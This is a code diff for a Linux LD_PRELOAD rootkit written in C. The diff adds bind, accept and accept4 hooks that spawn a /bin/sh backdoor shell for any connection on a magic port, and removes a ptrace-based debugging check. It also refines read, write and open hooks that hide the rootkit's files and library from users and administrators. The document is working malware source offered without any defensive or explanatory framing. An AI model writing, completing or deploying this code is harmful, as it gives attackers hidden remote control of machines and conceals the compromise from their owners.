@@ -1,12 +1,11 @@
 #include "rootkit.h"
 
+
 static void *get_orig(const char *name) {
     return dlsym(RTLD_NEXT, name);
 }
 
 static int is_stealth_active(void) {
-    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return 1;
-    ptrace(PTRACE_DETACH, 0, 1, 0);
     return 0;
 }
 
@@ -16,6 +15,90 @@ static int is_hidden(const char *name) {
     if (strstr(name, EVIL_LIB)) return 1;
     if (strstr(name, "ld.so.preload")) return 1;
     return 0;
+}
+// track connections
+static int handling_magic_port = 0;
+
+int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
+    orig_bind_t orig = (orig_bind_t)get_orig("bind");
+
+    if (addr && addr->sa_family == AF_INET && !is_stealth_active()) {
+        struct sockaddr_in *s = (struct sockaddr_in *)addr;
+        if (ntohs(s->sin_port) == MAGIC_PORT) {
+
+            handling_magic_port = 1;
+            errno = 0;
+            return 0;
+        }
+    }
+
+    return orig(sockfd, addr, addrlen);
+}
+
+int accept(int fd, struct sockaddr *sa, socklen_t *len) {
+    orig_accept_t orig = get_orig("accept");
+
+    // Check if this socket is bound to our magic port
+    struct sockaddr_in local_addr;
+    socklen_t addrlen = sizeof(local_addr);
+
+    if (getsockname(fd, (struct sockaddr *)&local_addr, &addrlen) == 0) {
+        if (local_addr.sin_family == AF_INET &&
+            ntohs(local_addr.sin_port) == MAGIC_PORT) {
+
+            // This is our magic port - accept the connection
+            int cfd = orig(fd, sa, len);
+            if (cfd >= 0) {
+                // Spawn shell
+                if (fork() == 0) {
+                    // Child process - redirect stdio to socket
+                    dup2(cfd, 0);
+                    dup2(cfd, 1);
+                    dup2(cfd, 2);
+                    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
+                    exit(0);
+                }
+                // Parent process - close and hide the connection
+                close(cfd);
+                return -1;
+            }
+        }
+    }
+
+    // Normal accept for other ports
+    return orig(fd, sa, len);
+}
+
+// Hook accept4() - same as accept() but with flags
+int accept4(int fd, struct sockaddr *sa, socklen_t *len, int flags) {
+    orig_accept4_func_type orig = (orig_accept4_func_type)get_orig("accept4");
+
+    // Check if this socket is bound to our magic port
+    struct sockaddr_in local_addr;
+    socklen_t addrlen = sizeof(local_addr);
+
+    if (getsockname(fd, (struct sockaddr *)&local_addr, &addrlen) == 0) {
+        if (local_addr.sin_family == AF_INET &&
+            ntohs(local_addr.sin_port) == MAGIC_PORT) {
+
+            // This is our magic port - accept the connection
+            int cfd = orig(fd, sa, len, flags);
+            if (cfd >= 0) {
+                // Spawn shell
+                if (fork() == 0) {
+                    dup2(cfd, 0);
+                    dup2(cfd, 1);
+                    dup2(cfd, 2);
+                    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
+                    exit(0);
+                }
+                close(cfd);
+                return -1;
+            }
+        }
+    }
+
+    return orig(fd, sa, len, flags);
 }
 
 struct dirent *readdir(DIR *dirp) {
@@ -32,9 +115,10 @@ ssize_t read(int fd, void *buf, size_t count) {
     orig_read_t orig = get_orig("read");
     ssize_t n = orig(fd, buf, count);
     if (n > 0 && !is_stealth_active()) {
-        char *p = memmem(buf, n, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX));
-        if (p) memset(buf, 0, n); 
-        if (memmem(buf, n, EVIL_LIB, strlen(EVIL_LIB))) memset(buf, 0, n);
+        if (memmem(buf, n, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) ||
+            memmem(buf, n, EVIL_LIB, strlen(EVIL_LIB))) {
+            memset(buf, 0, n);
+        }
     }
     return n;
 }
@@ -63,7 +147,7 @@ int open(const char *path, int flags, ...) {
     orig_open_t orig = get_orig("open");
     const char *new_path = path;
     if (!is_stealth_active() && is_hidden(path)) new_path = "/dev/null";
-    
+
     if (flags & O_CREAT) {
         va_list a; va_start(a, flags);
         mode_t m = va_arg(a, mode_t);
@@ -73,48 +157,13 @@ int open(const char *path, int flags, ...) {
     return orig(new_path, flags);
 }
 
-int accept(int fd, struct sockaddr *sa, socklen_t *len) {
-    orig_accept_t orig = get_orig("accept");
-    int cfd = orig(fd, sa, len);
-    if (cfd >= 0 && sa && sa->sa_family == AF_INET) {
-        struct sockaddr_in *s = (struct sockaddr_in *)sa;
-        if (ntohs(s->sin_port) == MAGIC_PORT) {
-            if (fork() == 0) {
-                dup2(cfd, 0); dup2(cfd, 1); dup2(cfd, 2);
-                execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
-                exit(0);
-            }
-            close(cfd);
-            return -1;
-        }
-    }
-    return cfd;
-}
-
-int accept4(int fd, struct sockaddr *sa, socklen_t *len, int flags) {
-    orig_accept4_func_type orig = (orig_accept4_func_type)get_orig("accept4");
-    int cfd = orig(fd, sa, len, flags);
-    if (cfd >= 0 && sa && sa->sa_family == AF_INET) {
-        struct sockaddr_in *s = (struct sockaddr_in *)sa;
-        if (ntohs(s->sin_port) == MAGIC_PORT) {
-            if (fork() == 0) {
-                dup2(cfd, 0); dup2(cfd, 1); dup2(cfd, 2);
-                execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
-                exit(0);
-            }
-            close(cfd);
-            return -1;
-        }
-    }
-    return cfd;
-}
-
-
 ssize_t write(int fd, const void *buf, size_t count) {
     orig_write_t orig = get_orig("write");
     if (!is_stealth_active() && buf && count > 0) {
         if (memmem(buf, count, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) ||
-            memmem(buf, count, EVIL_LIB, strlen(EVIL_LIB))) return count;
+            memmem(buf, count, EVIL_LIB, strlen(EVIL_LIB))) {
+            return count;  // Pretend we wrote, but actually block it
+        }
     }
     return orig(fd, buf, count);
 }
